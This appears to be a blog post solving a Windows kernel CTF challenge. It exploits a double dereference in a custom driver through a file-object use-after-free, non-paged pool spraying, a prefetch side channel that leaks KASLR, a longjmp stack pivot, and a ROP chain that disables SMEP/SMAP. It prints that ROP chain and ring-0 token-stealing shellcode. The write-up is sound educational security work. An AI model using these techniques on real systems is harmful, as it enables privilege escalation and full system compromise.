@@ -1,0 +1,642 @@
+import { ChallengeInfo } from "#components/ChallengeInfo.js";
+
+export const title = "Plfanzen CTF 2026";
+export const description =
+    "WINDOWS STILL SUCKS - Exploiting a double deref in the Windows kernel.";
+
+<ChallengeInfo items={{
+    author: "____kris",
+    solves: 0,
+    difficulty: "hard"
+}}>
+some platns need a lot of light, so they will grow best near widnows.
+
+I have built a fun little driver that shows you information about files in Windows. Perhaps it can also show you the flag?
+
+Connect to the remote instance using SSH. You get access to an interactive shell on a Windows Server 2025 Core installation with the driver installed and running. You can use SFTP to upload files to the machine as well.
+
+The flag is stored in raw ASCII Text on the disk device "\?\PhysicalDrive1". There is no filesystem, the first physical sector contains the flag. You need to escalate privileges to be able to read from raw disk devices (must be NT AUTHORITY\SYSTEM or in the Administrators group). For your convenience, there is also a readflag program at C:\Windows\ReadFlag.exe that reads the first sector and writes it to stdout. It does not give you any special privileges, it's just there to pass the correct parameters for opening the physical disk, since that's hard to do from cmd / powershell.
+
+The handout only contains the sources for the driver and ReadFlag. The full VM image and qemu startscript for local testing can be downloaded here. The files are large (14GB), you should look at the driver source first :) In the VM image that you download you can log into the administrator account using the password Password123!, this is disabled on remote.
+
+</ChallengeInfo>
+
+Disclaimer: I did use ChatGPT to help me solve this challenge (although only through web interface, no codex), since I'm too Linux pilled and Windows makes no sense. My usage was mostly just asking ChatGPT to write me boilerplate code to interact with Windows and looking for interesting blog posts. I did not use AI to write this blog post.
+
+Another Windows kernel challenge :P! Again the vulnerability is pretty simple, but exploitation ends up being pretty complicated. This time the vulnerability is introduced by a buggy custom kernel driver called FileUtility. The driver is very simple, all it does is take an input HANDLE to a file and writes information about the file back to userland. Heres the source code, see if you can spot the bug:
+
+```c path="FileUtility/main.c" open
+
+```
+
+The bug is in the switch statement for the DeviceControl handler. The first case is missing the terminating `break` statement and falls through into the second case, providing a double deref on the specified `fileObject`.
+
+```c path="FileUtility/main.c" range="312,354" open filename="FileUtility bug"
+
+```
+
+## Windows Kernel Debugging
+
+I have only had very basic experience with Windows Kernel debugging, from my work on Lokaltal (another Windows Kernel challenge from the same author). The easiest setup for a Linux host is to setup two Windows VMs. One of the VMs is the challenge VM and the other is needs to run WinDBG.
+
+The first step is to import the challenge VM into VMWare. Take the provided qcow2 rootfs and converting to vmdk with `qemu-img convert -f qcow2 -O vmdk rootfs.qcow2 rootfs.vmdk`
+
+1. Create new VM in VMWare
+2. Choose `Typical` setup
+3. Choose `I will install the operating system later`
+4. Choose `Windows` for the guest operating system and `Windows 10 x64` for the version
+5. Name the VM whatever
+6. Make the disk as small as possible and choose the single file option
+7. Leave the hardware as-is, since the VMWare defaults match the qemu options (1 core, 2 GB mem)
+8. Edit VM settings, remove the existing disk and add a new `Hard Disk`, `NVMe`, from our existing `rootfs.vmdk`
+
+For my system I have to make sure to start the VMWare networking service or networking won't work at all.
+
+```sh open
+systemctl start vmware-networks
+systemctl status vmware-networks
+```
+
+For the WinDBG VM I grabbed a Windows 10 iso from `https://www.microsoft.com/en-us/software-download/windows10ISO`. The VM setup installations are basically the same, except instead of choosing `I will install the operating system later` select the downloaded iso file. When prompted for the windows edition choose `Windows Home`. For the disk its necessary to have an actual disk this time, I chose 24 GB since 16 GB seems to be the absolute minimum and I wanted extra space for WinDBG/tools and pdb downloads. It's also a good idea to change the resource defaults for this machine, I bumped the memory up to 3 GB and cpu cores to 2.
+
+Once the VMs are setup I used the same network debugging setup from Lokaltal. Using the admin creds for the challenge machine network debuggin can be enabled:
+
+```sh open
+bcdedit /debug on
+bcdedit /dbgsettings net hostip:<DEBUGGER_IP> port:50000
+# Key=2p6egbupzs33e.2nn2u32a1l38f.3fmhphk46k1da.t65p3mp3f08y
+```
+
+To grab the WinDBG VM ip I launched powershell and ran `ipconfig`. The challenge VM was assigned the ip `172.16.60.132` and the WinDBG VM got `172.16.60.133`. These ips are stable and don't change at all which is nice. I wrote the key that the final bcdedit command generates to a file and then scp'd it back to my host machine. This key is necessary to connect to the challenge VM from WinDBG.
+
+It's useful to have the windows `ntoskrnl.exe` binary for analysis and I scp'd it from the challenge VM: `sshpass -p Password123_ scp -q lowpriv@172.16.60.132:'C:/Windows/System32/ntoskrnl.exe' .`. Without direct ssh access it would be possible to either set up a VMWare shared folder or mount the rootfs and extract the file directly. To get the pdb file I relied on WinDBG to download the proper file.
+
+1. Connect WinDBG to the challenge VM
+2. run `lm m nt`
+
+```text open
+kd> lm m nt
+Browse full module list
+start             end                 module name
+fffff802`883d0000 fffff802`89820000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\B65A1E5D9D57D828E82F8C75F19E98571\ntkrnlmp.pdb
+```
+
+3. Copy it over to my host machine with `python -m http.server`.
+
+In order for `binja` to pick up pdb files automatically it needs to be the same name as the exe file, so in this case `ntkrnlmp.pdb` needs to be renamed to `ntoskrnl.pdb` to match `ntoskrnl.exe`.
+
+One of the things that takes getting used to in WinDBG is how they print addresses and that all numbers are assumed to be hex.
+
+### Useful WinDBG Commands
+
+**g**
+
+Continues execution, similar to `continue` for gdb.
+
+**t**
+
+Steps one instruction, stepping into calls. Similar to `stepi` for gdb.
+
+**dt [type] [filter]\***
+
+Prints type info
+
+**dt [type] [addr] [filter]\***
+
+Prints type applied to the resulting address of evaluating `[expr]`
+You can also filter for relevant fields. Plus filtering accepts `*` wildcards.
+
+**eb, ew, ed, eq**
+
+Commands for editing memory.
+For example, `eb [addr] [val]` writes a single byte `[val]` to `[addr]`.
+
+**db**, **dw**, **dd**, **dq**
+
+Commands for dumping memory.
+
+**qwo**, **dwo**, **poi**
+
+Functions for dumping memory, can be used in expressions.
+Qword, dword, pointer.
+For example: `qwo(@rcx) == 0`.
+
+**dq [addr] [count]?**
+
+Similar to `tele` for gdb. Count can be `L[count]` to customize amount shown.
+
+**u [addr] [count]?**
+
+Disassembles code at `[addr]`. Count can be `L[count]` to number of instructions.
+
+**bp [addr] "command"?**
+
+Sets a breakpoint at addr. Optionally accepts a string command that is evaluated when the breakpoint is hit. With this its possible to collection information and optionally continue after hitting the breakpoint.
+For example, `bp ExAllocatePool2 ".if (@rcx == 0x40) { .printf \"Breakpoint hit!\" } .else { gc }"`.
+Or `bp ExAllocatePool2 ".printf \"Size: %d\", @rcx; gc"`.
+
+**bl**
+
+Lists breakpoints.
+
+**bc [id]+**
+
+Clears breakpoint.
+
+**bd [id]+**
+
+Disables breakpoint.
+
+**be [id]+**
+
+Enabled breakpoint.
+
+**!pte [vaddr]**
+
+Show page table information about a virtual address.
+
+**!process**
+
+Process information. I commonly use `!process 0 1 [name]` to search for processes.
+The first argument is the process selector, `-1` is current process and `0` is all.
+The second argument is the verbosity level, `0` prints minimal info, `1` prints all the process info, `2` will show process and thread info.
+
+**.process [addr]**
+
+Change the implicit process to the one described by the `_EPROCESS` structure at `[addr]`.
+
+**.thread [addr]**
+
+Change the implicit thread to the one described by the `_ETHREAD` structure at `[addr]`
+
+**!address [addr]?**
+
+Show information about an address, similar to `xinfo` in gdb.
+Without any arguments it behaves similar to `vmmap`/`pagewalk`.
+
+**!pool [addr]**
+
+Get information about what heap pool an object resides in and adjacent objects in the same page.
+
+**!object [addr]**
+
+Show information about a Windows Object, needs to have a `_OBJECT_HEADER`.
+
+**!handle [id]**
+
+Dump information about a HANDLE for the current process.
+
+**!fileobj [addr]**
+
+Show information about a Windows `_FILE_OBJECT`.
+
+### Debugging tricks
+
+One really nice thing about WinDBG is that it will pick up `int3` breakpoints in userland code, which is great for debugging userland exploit code.
+Sometimes it is difficult to remember which `int3` breakpoint I've hit in the code, especially after liberally sprinkling them all over my exploit and commenting/uncommenting them. I've found it helpful to differentiate them by placing some marker after them, usually just nop instructions.
+
+```c open
+#define BP(n) asm volatile("int3; .rept " #n "; nop; .endr")
+```
+
+This macro inserts `n` nops after the `int3` to make it recognizable in the debugger. It doesn't scale well but it's easy to switch to some other recognizable sequence.
+
+For cross compilation I use zig version `0.13.0`. Why `0.13.0` specifically ? Because I don't like the newer zig version changes :P.
+
+For code completion for Windows headers I use the vscode `clangd` plugin with a customized `.clangd` file:
+
+```text open
+CompileFlags:
+    Add:
+        - "--include-directory=[path to zig]/lib/libc/include/any-windows-any/"
+        - "-fdeclspec"
+```
+
+You should always make snapshots of the challenge VM to avoid wasting time waiting for the VM to boot and just go directly to a clean state. This also has an added benefit of effectively disabling KASLR since the kernel will be at the same place every time.
+
+## Exploration
+
+With a double deref bug, the obvious path is to keep a reference to the refcounted object somewhere in the kernel, then uaf it using the double deref it. I first asked GPT for ways to hold a reference to file objects in the kernel, and it recommended using `DuplicateHandle`. My first attempt was something like this:
+
+1. CreateFile // HANDLE A, ref=1
+2. DuplicateHandle // HANDLE B, ref=2
+3. trigger FileUtility double deref // ref=1
+4. close HANDLE A // ref=0, freed
+5. access HANDLE B // uaf!
+
+However when I actually tried this I would get a kernel BugCheck on step #4. After a bit of investigation with GPT I found out that Windows `_OBJECT` has two reference counts, `HandleCount` and `PointerCount`, and `_FILE_OBJECT` inherits `_OBJECT` through a shared `_OBJECT_HEADER`. Calling `ObDereferenceObject` decrements the `PointerCount` but not the `HandleCount`, and when `PointerCount` hits zero the kernel BugChecks if `HandleCount` is non zero.
+
+While it would be nice to keep a reference to the uafed file through a stale HANDLE, I didn't really see any way around this check. So I asked GPT for ways to keep pointer references to the file object instead of handle references and it suggested using `CreateFileMappingW`. The new plan is:
+
+1. CreateFile // HANDLE A, href=1, pref=1
+2. CreateFileMapping // href=1, pref=3
+3. trigger FileUtility double deref twice // href=1, pref=1
+4. close HANDLE A // href=0, pref=0, freed
+
+Here I'll show how I debugged the reference counts. In Windows the HANDLE type is opaque, but its actually just an integer like file descriptors in Linux. You can just cast them directly or use the `HandleToLong` macro. In my exploit I would print the victim file handle, then look it up in WinDBG. When you hit `int3` breakpoints in userland code it will set the implicit process and thread to the one that triggered the breakpoint, so no manual switching is needed.
+
+After `CreateFile`:
+
+```text open
+kd> !handle 0000000000004154
+4154: Object: ffffd08f28392750  GrantedAccess: 0012019f (Inherit) Entry: ffff93819a1f1550
+Object: ffffd08f28392750  Type: (ffffd08f24ab64e0) File
+    ObjectHeader: ffffd08f28392720 (new version)
+        HandleCount: 1  PointerCount: 1
+        Directory Object: 00000000  Name: \Users\lowpriv\file_spray_2628_0 {HarddiskVolume3}
+```
+
+After `CreateFileMapping`:
+
+```text open
+kd> !handle 0000000000004154
+4154: Object: ffffd08f28392750  GrantedAccess: 0012019f (Inherit) Entry: ffff93819a1f1550
+Object: ffffd08f28392750  Type: (ffffd08f24ab64e0) File
+    ObjectHeader: ffffd08f28392720 (new version)
+        HandleCount: 1  PointerCount: 32765
+        Directory Object: 00000000  Name: \Users\lowpriv\file_spray_2628_0 {HarddiskVolume3}
+
+kd> !trueref ffffd08f28392750
+ffffd08f28392750: HandleCount: 1 PointerCount: 32765 RealPointerCount: 3
+```
+
+After triggering FileUtility bug twice:
+
+```text open
+kd> !handle 0000000000004154
+4154: Object: ffffd08f28392750  GrantedAccess: 0012019f (Inherit) Entry: ffff93819a1f1550
+Object: ffffd08f28392750  Type: (ffffd08f24ab64e0) File
+    ObjectHeader: ffffd08f28392720 (new version)
+        HandleCount: 1  PointerCount: 32761
+        Directory Object: 00000000  Name: \Users\lowpriv\file_spray_2628_0 {HarddiskVolume3}
+
+kd> !trueref ffffd08f28392750
+ffffd08f28392750: HandleCount: 1 PointerCount: 32761 RealPointerCount: 1
+```
+
+After `CloseHandle`:
+
+```text open
+kd> !handle 0000000000004154
+4154: free handle, Entry address ffff93819a1f1550, Next Entry ffff93819a1f1570
+
+kd> !pool ffffd08f28392750
+Pool page ffffd08f28392750 region is Nonpaged pool
+ ffffd08f28392090 size:  190 previous size:    0  (Allocated)  IoSB Process: ffffd08f281813c0
+ ffffd08f28392220 size:  190 previous size:    0  (Allocated)  IoSB Process: ffffd08f281813c0
+ ffffd08f283923b0 size:  190 previous size:    0  (Allocated)  File
+ ffffd08f28392540 size:  190 previous size:    0  (Allocated)  File
+*ffffd08f283926d0 size:  190 previous size:    0  (Allocated) *IoSB Process: ffffd08f281813c0
+		Pooltag IoSB : Io system buffer, Binary : nt!io
+ ffffd08f28392860 size:  190 previous size:    0  (Allocated)  IoSB Process: ffffd08f281813c0
+ ffffd08f283929f0 size:  190 previous size:    0  (Allocated)  File
+ ffffd08f28392b80 size:  190 previous size:    0  (Allocated)  IoSB Process: ffffd08f281813c0
+ ffffd08f28392d10 size:  190 previous size:    0  (Allocated)  File
+```
+
+In this case I've already reclaimed the freed file object chunk, but otherwise you would see that the file is considered to be free. It also tells us that the object is in the non paged pool, which affects the heap spraying primitives available to us.
+
+## Exploitation
+
+Now there are a few options available. Without any direct HANDLE references it is difficult to abuse directly. I considered:
+
+1. Reallocating the file object as another object and freeing it, converting file object uaf into uaf with some other object
+2. Reallocating the file object as a more privileged file object, similar to DirtyCred in Linux
+3. Reclaiming the file object with a fake file object and attempting to abuse stale references
+
+Option #1 is difficult because the object needs to be the same size and I'm not really familiar with exploitable Windows objects. Also file objects are a special kind of Windows object that has a variable sized header and fixed size object header, which limits the possible objects to reclaim with. Option #2 seemed like a good lead, GPT claimed that Windows doesn't do any extra permission checks past `CreateFile` and linked blog posts ([1](https://projectzero.google/2017/08/bypassing-virtualbox-process-hardening.html), [2](https://jxy-s.github.io/herpaderping/res/DivingDeeper.html)) that reference corrupting a files in memory page cache. But eventually I decided not to explore either of these options because I simply didn't know that much about Windows internals or what files to target and wanted to solve this challenge quickly.
+
+This left me with Option #3, reclaiming the file object with some sort of heap spray that gives enough control over the object to convert any stale accesses to privilege escalation. For Lokaltal the target object was in the paged pool and I used WNF spraying combined with pipe attribute spraying to reclaim the chunk, but now the object is in the non paged pool. I asked GPT to find writeups about spraying the non paged pool and one of the results was this: [https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/readme.md](https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/master/readme.md). It describes how to spray arbitrary sized chunks with arbitrary data and without any structure headers in the non paged pool using unbuffered pipe entries, which is a pretty sweet heap spraying technique for exploitation.
+
+`CreateFileMapping` doesn't actually map any memory, it just creates a `_SECTION` object and returns a HANDLE. In order to map the file in memory we have to use `NtFsMapViewOfSection` (essentially equivalent to mmap). Remember that this section handle still holds a stale reference to the freed file somewhere, which we now need to abuse. Although it turns out that `NtFsMapViewOfSection` doesn't seem to use the file object at all, I reclaimed the file object with a chunk filled with `Z` and the syscall still completed successfully. Luckily for us, operating systems are pretty lazy, when you ask them to map some memory they will almost always just map the zero page and lazily commit the real pages when the page is faulted. We can test this by just accessing the memory mapped by `NtFsMapViewOfSection`.
+
+```text open
+Access violation - code c0000005 (!!! second chance !!!)
+nt!IoGetRelatedDeviceObject+0x5e:
+fffff802`88760eae 488b4008        mov     rax,qword ptr [rax+8]
+kd> kv
+ # Child-SP          RetAddr               : Args to Child                                                           : Call Site
+00 fffffb06`cf3c6808 fffff802`88760999     : fffffb06`cf3c6900 ffffe170`80761fe0 ffffd08f`281847c0 ffffd08f`28184880 : nt!IoGetRelatedDeviceObject+0x5e
+01 fffffb06`cf3c6810 fffff802`88695abe     : 00000000`00000001 fffffb06`cf3c6900 ffffd08f`24a60560 ffffd08f`24a60520 : nt!IoPageReadEx+0x79
+02 fffffb06`cf3c6870 fffff802`886948bd     : 00000000`00000000 00000000`00000002 00000000`00000001 00000000`00000000 : nt!MiIssueHardFaultIo+0x1ba
+03 fffffb06`cf3c68c0 fffff802`886fd17a     : ffff8000`00000000 000001d8`7f970000 00000000`c0033333 ffff9381`944f3af0 : nt!MiIssueHardFault+0x251
+04 fffffb06`cf3c6970 fffff802`88a813cb     : 00000000`1decc000 00000000`00004154 0000008c`26fff180 00000000`00000000 : nt!MmAccessFault+0x46a
+05 fffffb06`cf3c6ae0 00000000`006cddb0     : 00000000`00004154 000001d8`7f640080 7fffffff`fffffffc 000001d8`7f73531a : nt!KiPageFault+0x38b (TrapFrame @ fffffb06`cf3c6ae0)
+06 0000008c`26fff110 00000000`00004154     : 000001d8`7f640080 7fffffff`fffffffc 000001d8`7f73531a 0000008c`26fff16d : 0x6cddb0
+07 0000008c`26fff118 000001d8`7f640080     : 7fffffff`fffffffc 000001d8`7f73531a 0000008c`26fff16d 00000000`00000003 : 0x4154
+08 0000008c`26fff120 7fffffff`fffffffc     : 000001d8`7f73531a 0000008c`26fff16d 00000000`00000003 0000008c`26fff180 : 0x000001d8`7f640080
+09 0000008c`26fff128 000001d8`7f73531a     : 0000008c`26fff16d 00000000`00000003 0000008c`26fff180 00000000`00000000 : 0x7fffffff`fffffffc
+0a 0000008c`26fff130 0000008c`26fff16d     : 00000000`00000003 0000008c`26fff180 00000000`00000000 00007ff8`be877f01 : 0x000001d8`7f73531a
+0b 0000008c`26fff138 00000000`00000003     : 0000008c`26fff180 00000000`00000000 00007ff8`be877f01 000001d8`7f737fd0 : 0x0000008c`26fff16d
+0c 0000008c`26fff140 0000008c`26fff180     : 00000000`00000000 00007ff8`be877f01 000001d8`7f737fd0 00000000`00000034 : 0x3
+0d 0000008c`26fff148 00000000`00000000     : 00007ff8`be877f01 000001d8`7f737fd0 00000000`00000034 000101f8`00000001 : 0x0000008c`26fff180
+kd> ? @rax
+Evaluate expression: 6510615555426900570 = 5a5a5a5a`5a5a5a5a
+```
+
+Finally a kernel crash :D. This confirms the lazy file mapping theory.
+
+I'll skip the boring reverse engineering details, but basically since the crash is accessing an address that is derived from our fake file content and the exact stack trace is available, we end up here:
+
+```c open
+uint64_t IoPageReadEx(struct _FILE_OBJECT* File, struct _MDL* Mdl, int64_t* arg3, struct _KEVENT* Event, struct _IO_STATUS_BLOCK* IOSB,
+int32_t arg6, void* arg7)
+
+    /* -- snip -- */
+
+    struct _DEVICE_OBJECT* Device = IoGetRelatedDeviceObject(File)
+```
+
+Crashing while the kernel attempts to find the device object from our fake file object. Faking the device object as well leads to this:
+
+```text open
+Access violation - code c0000005 (!!! second chance !!!)
+nt!IopfCallDriver+0x4e:
+fffff802`887613ce 4a8b44c970      mov     rax,qword ptr [rcx+r9*8+70h]
+kd> kv
+ # Child-SP          RetAddr               : Args to Child                                                           : Call Site
+00 fffffb06`cf4c37a0 fffff802`88761353     : ffffd08f`28247480 ffffe100`e5589900 00000000`00000043 ffffd08f`24a60304 : nt!IopfCallDriver+0x4e
+01 fffffb06`cf4c37e0 fffff802`88760be6     : ffffd08f`28247080 ffffd08f`24a60450 00000001`00000000 ffffd08f`28247540 : nt!IofCallDriver+0x13
+02 fffffb06`cf4c3810 fffff802`88695abe     : 00000000`00000001 fffffb06`cf4c3900 ffffd08f`24a603a0 ffffd08f`24a60360 : nt!IoPageReadEx+0x2c6
+03 fffffb06`cf4c3870 fffff802`886948bd     : 00000000`00000000 00000000`00000002 00000000`00000001 00000000`00000000 : nt!MiIssueHardFaultIo+0x1ba
+04 fffffb06`cf4c38c0 fffff802`886fd17a     : ffff8000`00000000 000001ca`b1330000 00000000`c0033333 ffff9381`9479c110 : nt!MiIssueHardFault+0x251
+05 fffffb06`cf4c3970 fffff802`88a813cb     : 00000000`5bb98300 00000000`00004154 00000049`131ff200 00007ff8`bd753240 : nt!MmAccessFault+0x46a
+06 fffffb06`cf4c3ae0 00000000`006eddf0     : 00000000`00004154 000001ca`b11e0080 7fffffff`fffffffc 000001ca`b139531a : nt!KiPageFault+0x38b (TrapFrame @ fffffb06`cf4c3ae0)
+07 00000049`131ff010 00000000`00004154     : 000001ca`b11e0080 7fffffff`fffffffc 000001ca`b139531a 00000049`131ff080 : 0x6eddf0
+08 00000049`131ff018 000001ca`b11e0080     : 7fffffff`fffffffc 000001ca`b139531a 00000049`131ff080 00000000`00000003 : 0x4154
+09 00000049`131ff020 7fffffff`fffffffc     : 000001ca`b139531a 00000049`131ff080 00000000`00000003 00000049`131ff200 : 0x000001ca`b11e0080
+0a 00000049`131ff028 000001ca`b139531a     : 00000049`131ff080 00000000`00000003 00000049`131ff200 00000000`00000000 : 0x7fffffff`fffffffc
+0b 00000049`131ff030 00000049`131ff080     : 00000000`00000003 00000049`131ff200 00000000`00000000 000001ca`b12d0000 : 0x000001ca`b139531a
+0c 00000049`131ff038 00000000`00000003     : 00000049`131ff200 00000000`00000000 000001ca`b12d0000 000001ca`b1397fd0 : 0x00000049`131ff080
+0d 00000049`131ff040 00000049`131ff200     : 00000000`00000000 000001ca`b12d0000 000001ca`b1397fd0 00000000`00000050 : 0x3
+0e 00000049`131ff048 00000000`00000000     : 000001ca`b12d0000 000001ca`b1397fd0 00000000`00000050 00000001`000c0000 : 0x00000049`131ff200
+kd> ? @rcx
+Evaluate expression: 4846791580151137091 = 43434343`43434343
+```
+
+Now the crash is at a much more interesting location:
+
+```c open
+uint64_t IopfCallDriver(struct _DEVICE_OBJECT* Device, struct _IRP* arg2)
+
+    /* -- snip -- */
+
+    return Device->DriverObject->MajorFunction[fn](DeviceObject: Device)
+```
+
+An arbitrary function call from our controlled device object! Now I should mention that all of the payloads up to this point were stored in normal userland stack memory, because Windows doesn't use SMAP. Taking a look at cr4 we can see that the SMAP and SMEP bits are set, but SMAP is disabled because the AC flag is set.
+
+```text open
+kd> ? @cr4
+Evaluate expression: 3606136 = 00000000`00370678
+/* SMEP is bit 21
+   SMAP is bit 20
+*/
+kd> r
+/* -- snip -- */
+iopl=0         nv up ei ng nz ac pe cy
+```
+
+We can't just run a ring 0 shellcode payload from userland because SMEP is enabled and KVA shadowing is enabled (Windows version of KPTI), which also sets the NX bit for the top level page table entry that controls userland mappings in the kernel page table. Unfortunately Windows does have KASLR and none of the `NtQuerySystemInformation` kernel leaks I had GPT write seemed to work. All is not lost however, since the kernel is running through KVM we can take advantage of hardware side channel attacks to leak the kernel base.
+
+I had GPT find blog posts related to performing prefetch side channels on Windows, with these two being the most useful:
+
+1. [https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/](https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/)
+2. [https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_leak.h](https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_leak.h)
+
+[This blog post](https://xacone.github.io/kaslr_leak_24h2.html) also mentions that the Windows kernel is randomized with an alignment of 2 MB when the system has more than 2 GB of memory because it will use large pages. The challenge VM has exactly 2 GB of memory, so no large pages for us :(. Through some empirical testing (rebooting the challenge VM over and over again) I found that the kernel is mapped at an alignment of 16 bits with 19 bits of randomness, in the range `0xfffff80000000000` to `0xfffff80800000000`. Since KVA shadowing is enabled the only part of the kernel actually mapped in this range in the user page tables is the syscall entrypoint. The exact offset from the kernel base can be found by reading `MSR_LSTAR`:
+
+```text open
+kd> rdmsr 0xc0000082
+msr[c0000082] = fffff802`88f83200
+kd> lm m nt
+Browse full module list
+start             end                 module name
+fffff802`883d0000 fffff802`89820000   nt         (pdb symbols)          C:\ProgramData\Dbg\sym\ntkrnlmp.pdb\B65A1E5D9D57D828E82F8C75F19E98571\ntkrnlmp.pdb
+kd> ? fffff802`88f83200-fffff802`883d0000
+Evaluate expression: 12268032 = 00000000`00bb3200
+```
+
+There are also two other pages that are mapped before the LSTAR page in the user page tables. So the prefetch scanning ends up being:
+
+1. calculate the unmapped/mapped threshold
+2. scan from `0xfffff80000000000` to `0xfffff80800000000` at `0x10000` increments, taking note of any mapped candidates
+3. filter the candidates again with more testing iterations to ensure they are actually mapped
+4. filter the candidates for ones that have exactly two pages mapped before them
+5. if this process yields only one possible candidate, assume LSTAR has been found
+6. otherwise go back to step 1
+
+While this code is fast and stable for me, it depends on the exact processor and might have taken more work to replicate on remote. Since we're upsolving and remote is down we don't have the chance to test if this would have also been stable on remote.
+
+With our newly acquired KASLR leak we can convert our RIP control into something more useful. The decomp of `IopfCallDriver` shows that the first argument is a pointer to the device object that we control. At first I looked at [https://jle-k.com/blog/Exploiting+CVE-2026-21241](https://jle-k.com/blog/Exploiting+CVE-2026-21241) which mentions using the `Rtl(Set|Clear)Bit(s)` functions in the kernel to privesc, but the structure of the device object ends up making them unusable. Eventually while doom scrolling `ntoskrnl.exe` in binja, I came across this function:
+
+```c open
+int64_t __longjmp_internal(int64_t* arg1, int64_t arg2)
+    sub     rsp, 0x48
+    test    rdx, rdx
+    jne     0x14069ceec
+
+    inc     rdx
+
+    xor     r10, r10  {0x0}
+    cmp     qword [rcx], r10
+    jne     0x14069cf82
+
+    lfence
+    mov     rax, rdx
+    mov     rbx, qword [rcx+0x8]
+    mov     rsi, qword [rcx+0x20]
+    mov     rdi, qword [rcx+0x28]
+    mov     r12, qword [rcx+0x30]
+    mov     r13, qword [rcx+0x38]
+    mov     r14, qword [rcx+0x40]
+    mov     r15, qword [rcx+0x48]
+    ldmxcsr dword [rcx+0x58]
+    movdqa  xmm6, xmmword [rcx+0x60]
+    movdqa  xmm7, xmmword [rcx+0x70]
+    movdqa  xmm8, xmmword [rcx+0x80]
+    movdqa  xmm9, xmmword [rcx+0x90]
+    movdqa  xmm10, xmmword [rcx+0xa0]
+    movdqa  xmm11, xmmword [rcx+0xb0]
+    movdqa  xmm12, xmmword [rcx+0xc0]
+    movdqa  xmm13, xmmword [rcx+0xd0]
+    movdqa  xmm14, xmmword [rcx+0xe0]
+    movdqa  xmm15, xmmword [rcx+0xf0]
+    mov     rdx, qword [rcx+0x50]
+    mov     rbp, qword [rcx+0x18]
+    mov     rsp, qword [rcx+0x10]
+    jmp     rdx
+```
+
+... what?!?. Longjmp??? In the kernel?????? This function loads all the callee saved registers from its first argument, as well as the xmm registers and rip and rsp. None of the offsets for rip or rsp conflict with any fields in our fake device object, giving an easy stack pivot primitive. Even better is that the tail end of the function is a self contained gadget that loads rip, rbp, and rsp without clobbering any other registers. If KCFG was enabled this primitive is still usable, although you would be forced to use JOP and have a kernel stack leak as detailed [in this blog post](https://blog.slowerzs.net/posts/keyjumper/). I know KCFG is disabled because calls to `_guard_dispatch_icall` have been replaced with `KscpCfgDispatchUserCallTargetEsSmep` which just jmp to the target directly. I'm not sure _why_ its disabled but I'm not complaining.
+
+Again since SMAP is disabled we can stack pivot to a rop chain stored in userland that triggers a ring 0 shellcode payload:
+
+```c open
+/* ROPgadget works on windows binaries */
+  int x = 0;
+  void *rc[0x100];
+  rc[x++] = xchg_r11_rax_spadd_60_pop_rbx;
+  x += 0x60 / 8;
+  rc[x++] = 0;
+  rc[x++] = pop_rcx;
+  rc[x++] = (void *)0x70678;
+  rc[x++] = mov_cr4_rcx;
+  rc[x++] = pop_rax;
+  rc[x++] = pxe_base;
+  rc[x++] = mov_rax_ptr_rax;
+  rc[x++] = mov_rax_ptr_rax;
+  rc[x++] = pop_r8;
+  rc[x++] = (void *)0x7fffffffffffffffull;
+  rc[x++] = and_rax_r8;
+  rc[x++] = mov_r9_rax_mov_rax_r9;
+  rc[x++] = pop_rax;
+  rc[x++] = pxe_base;
+  rc[x++] = mov_rax_ptr_rax;
+  rc[x++] = mov_ptr_rax_r9;
+  rc[x++] = kernel_shellcode;
+```
+
+In Windows the root page table address is patched directly into certain functions (just look for functions that pertain to page tables, I used `MiCopyTopLevelMappings`) so we can read it out directly from the kernel text, unset the NX bit of the top level page table entry that controls user mappings, unset SMAP and SMEP in cr4, then return directly to shellcode stored in userland.
+
+```x86asm open
+kernel_shellcode:
+    /* current _ETHREAD */
+    mov rdx, gs:[0x188]
+    /* _ETHREAD init stack */
+    mov rdx, qword ptr [rdx + 0x28]
+    /* fixup rsp to point to the original stack location */
+    lea rsp, [rdx - 0x4d8]
+
+    /* current _ETHREAD */
+    mov rax, gs:[0x188]
+    /* current _EPROCESS */
+    mov rax, qword ptr [rax + 0x220]
+
+    /* System bytes*/
+    mov rcx, 0x6d6574737953
+    mov rdx, rax
+
+    /* search process links for System */
+search:
+    cmp qword ptr [rdx + 0x338], rcx
+    je found
+    mov rdx, qword ptr [rdx + 0x1d8 + 8]
+    sub rdx, 0x1d8
+    jmp search
+
+found:
+    /* copy System TOKEN */
+    mov rdx, qword ptr [rdx + 0x248]
+    mov qword ptr [rax + 0x248], rdx
+
+    /* return to IopfCallDriver */
+    mov rax, 0
+    ret
+```
+
+After returning to `IopfCallDriver` we never signaled that the paging operation has completed, so the kernel politely hangs the faulting thread in `MiWaitForInPageComplete` -> `KeWaitForSingleObject`. Then from a separate thread we wait for long enough that we are sure our TOKEN has been replaced with System TOKEN, and invoke `C:\Windows\ReadFlag.exe` to get the flag.
+
+```text open
+zig cc exploit.c exploit.s -o exploit -target x86_64-windows-gnu -DDEBUG=0 -O2 -masm=intel -g3 -flto
+sshpass -p Password123_ scp -q exploit lowpriv@172.16.60.132:exploit.exe
+sshpass -p Password123_ ssh -q lowpriv@172.16.60.132 exploit.exe || rm exploit
+thread handle = 00000000000000C0, tid = 2660
+waiting...
+hi!
+flag?
+found = 1
+LSTAR is most likely: fffff80288f83200
+kbase = fffff802883d0000
+hDevice handle = 00000000000000C4
+hFile handle = 0000000000004154
+avg mapped = 59
+avg unmapped = 102
+threshold = 80
+mapping handle = 0000000000004158
+ok: 1
+ok: 1
+file spray done
+setup rop chain
+closing
+views mapped
+kernel_shellcode = 1a102f
+starting...
+flag?
+flag?
+flag?
+flag?
+teemo{i_hate_windows}
+
+done
+```
+
+## Files
+
+```c path="exploit.c"
+
+```
+
+```makefile path="Makefile"
+
+```
+
+```c path="FileUtility/main.c"
+
+```
+
+```c path="FileUtility/interface.h"
+
+```
+
+## References
+
+You can see which links came from GPT from the `utm_source=chatgpt.com`.
+
